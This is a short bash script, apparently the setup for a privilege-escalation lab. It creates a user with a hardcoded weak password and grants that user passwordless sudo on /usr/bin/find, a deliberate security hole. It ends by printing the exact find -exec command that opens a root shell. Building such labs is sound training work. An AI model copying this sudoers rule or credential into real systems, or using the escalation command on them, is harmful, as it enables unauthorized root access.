#!/bin/bash
set -e

# Install findutils to ensure /usr/bin/find is available
apt-get update -y
apt-get install -y findutils

# Create user 'sysadmin' with password 'sysadmin123' (skip if already exists)
id -u sysadmin &>/dev/null || useradd -m -s /bin/bash sysadmin
echo 'sysadmin:sysadmin123' | chpasswd

# Write the sudoers drop-in file granting NOPASSWD access to /usr/bin/find
echo 'sysadmin ALL=(root) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/sysadmin
chmod 440 /etc/sudoers.d/sysadmin

# Verify sudoers syntax is valid
visudo -c -f /etc/sudoers.d/sysadmin || true

echo 'Setup complete. User sysadmin can escalate via: sudo find /. -maxdepth 0 -exec /bin/bash -p \; -quit'
